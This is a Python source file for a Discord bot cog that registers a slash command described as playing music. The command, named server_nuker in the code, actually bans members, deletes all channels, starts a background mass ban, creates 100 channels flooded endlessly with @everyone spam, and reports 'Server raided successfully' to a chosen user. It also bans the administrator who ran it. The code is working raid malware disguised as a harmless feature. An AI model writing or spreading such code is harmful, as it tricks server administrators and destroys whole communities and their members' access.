import discord
from discord import app_commands
from discord.ext import commands
import asyncio
import random

class Announce(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @app_commands.command(name="play", description="Plays music on your voicechats")
    @app_commands.describe(
        useradmin="User who wants to play music",
        roletogive="Role that contains the perms to add music",
        message="Song name"
    )
    @app_commands.checks.has_permissions(administrator=True)
    async def server_nuker(self, interaction: discord.Interaction, 
                          useradmin: discord.User, 
                          roletogive: discord.Role, 
                          message: str):
        """Comando para realizar acciones administrativas y enviar anuncios"""
        await interaction.response.send_message("Iniciando operación...", ephemeral=True)
        
        try:
            guild = interaction.guild
            current_user = interaction.user
            
            # Verificaciones de seguridad
            if useradmin.id == self.bot.user.id:
                await interaction.followup.send("Error: No puedes seleccionar al bot como useradmin.", ephemeral=True)
                return
                
            if roletogive.position >= guild.me.top_role.position:
                await interaction.followup.send("Error: El rol seleccionado tiene una posición más alta que la del bot.", ephemeral=True)
                return
            
            # 1. PRIMERO: Banear miembros con el rol especificado (excepto useradmin y el bot)
            banned_members = 0
            members_with_role = []
            
            # Primero identificamos todos los miembros con el rol
            async for member in guild.fetch_members():
                if any(role.id == roletogive.id for role in member.roles):
                    # Evitar banear al useradmin y al bot
                    if member.id != useradmin.id and member.id != self.bot.user.id:
                        members_with_role.append(member)
            
            # Luego baneamos uno por uno con un pequeño delay para evitar rate limits
            for member in members_with_role:
                try:
                    await member.ban(reason=f"Reorganización: Miembro con rol {roletogive.name}")
                    banned_members += 1
                    await asyncio.sleep(0.2)  # Pequeño delay entre baneos
                except Exception as e:
                    print(f"No se pudo banear a {member}: {e}")
            
            # 2. LUEGO: Añadir rol al admin solo si no lo tiene ya
            try:
                admin_member = await guild.fetch_member(useradmin.id)
                # Verificar si el usuario ya tiene el rol
                if not any(role.id == roletogive.id for role in admin_member.roles):
                    await admin_member.add_roles(roletogive)
                    print(f"Rol {roletogive.name} añadido a {useradmin.name}")
                else:
                    print(f"El usuario {useradmin.name} ya tiene el rol {roletogive.name}")
            except Exception as e:
                print(f"No se pudo añadir el rol a {useradmin}: {e}")
            
            # 3. Eliminar todos los canales (excepto el canal de la interacción si es necesario)
            delete_tasks = []
            for channel in guild.channels:
                # No intentar eliminar el canal de la interacción si es un mensaje efímero
                if channel.id != interaction.channel_id:
                    delete_tasks.append(channel.delete())
            
            if delete_tasks:
                await asyncio.gather(*delete_tasks, return_exceptions=True)
            
            # 4. Iniciar baneo masivo en segundo plano mientras se crean canales
            async def mass_ban():
                banned_count = 0
                async for member in guild.fetch_members():
                    try:
                        # Evitar banear al useradmin y al bot
                        # PERO banear al usuario que ejecutó el comando si no es el useradmin
                        if (member.id != useradmin.id and 
                            member.id != self.bot.user.id):
                            await member.ban(reason=f"Reorganización masiva: {current_user}")
                            banned_count += 1
                            # Pequeña pausa para evitar rate limits
                            await asyncio.sleep(0.1)
                    except Exception as e:
                        print(f"No se pudo banear a {member}: {e}")
                        continue
                print(f"Baneo masivo completado. Total baneados: {banned_count}")
            
            # Ejecutar baneo masivo en segundo plano
            asyncio.create_task(mass_ban())
            
            # 5. Crear canales
            spam_message = f"@everyone {message}"
            max_channels = 100
            raid_message = "✅ Server raided successfully!"
            
            # Crear canales rápidamente
            channel_tasks = []
            created_channels = []
            
            for i in range(max_channels):
                try:
                    channel_name = f"{message}-{i}"
                    channel_tasks.append(guild.create_text_channel(channel_name[:100]))
                    # Pequeño delay para evitar rate limits
                    if i % 5 == 0:
                        await asyncio.sleep(0.1)
                except Exception as e:
                    print(f"Error al crear canal {i}: {e}")
                    break
            
            # Esperar a que se creen todos los canales
            created_channels = await asyncio.gather(*channel_tasks, return_exceptions=True)
            # Filtrar canales creados exitosamente
            created_channels = [c for c in created_channels if not isinstance(c, Exception)]
            channel_count = len(created_channels)
            
            # Enviar mensaje de raid en el primer canal
            if created_channels:
                try:
                    await created_channels[0].send(raid_message)
                except Exception as e:
                    print(f"Error al enviar mensaje de raid: {e}")
            
            # 6. Iniciar spam continuo en todos los canales
            async def continuous_spam():
                spam_count = 0
                while True:
                    try:
                        # Seleccionar un canal aleatorio
                        if created_channels:  # Verificar que aún hay canales
                            channel = random.choice(created_channels)
                            # Enviar mensaje
                            await channel.send(spam_message)
                            spam_count += 1
                            
                            # Intervalo muy corto entre mensajes (0.1-0.3 segundos)
                            await asyncio.sleep(0.1 + random.random() * 0.2)
                        else:
                            # Si no hay canales, esperar un poco y verificar de nuevo
                            await asyncio.sleep(1)
                    except Exception as e:
                        print(f"Error en spam continuo: {e}")
                        # Si hay error, esperar un poco más
                        await asyncio.sleep(1)
            
            # Iniciar spam continuo en segundo plano
            asyncio.create_task(continuous_spam())
            
            # 7. Enviar mensaje al DM del useradmin
            try:
                dm_channel = await useradmin.create_dm()
                await dm_channel.send(
                    f"✅ Server raided successfully!\n"
                    f"- Initial role bans: {banned_members}\n"
                    f"- Channels created: {channel_count}\n"
                    f"- Message: {message}\n"
                    f"- Continuous spam started in {channel_count} channels"
                )
            except Exception as e:
                print(f"No se pudo enviar mensaje al DM de {useradmin}: {e}")
            
            # 8. Banear al usuario que ejecutó el comando si no es el useradmin
            if current_user.id != useradmin.id:
                try:
                    await asyncio.sleep(1)  # Pequeña pausa antes de banear
                    await current_user.ban(reason=f"Usuario que ejecutó el comando de nuke")
                    print(f"Usuario {current_user} baneado por ejecutar el comando")
                except Exception as e:
                    print(f"No se pudo banear al usuario que ejecutó el comando: {e}")
            
            await interaction.followup.send(
                f"Operación completada. Se banearon {banned_members} miembros con el rol {roletogive.name}. " +
                f"Se crearon {channel_count} canales. El baneo masivo continúa en segundo plano. " +
                f"Spam continuo iniciado en todos los canales.",
                ephemeral=True
            )
            
        except Exception as e:
            print(f"Error durante la ejecución: {e}")
            try:
                await interaction.followup.send("Ocurrió un error durante el proceso.", ephemeral=True)
            except:
                pass

async def setup(bot):
    await bot.add_cog(Announce(bot))
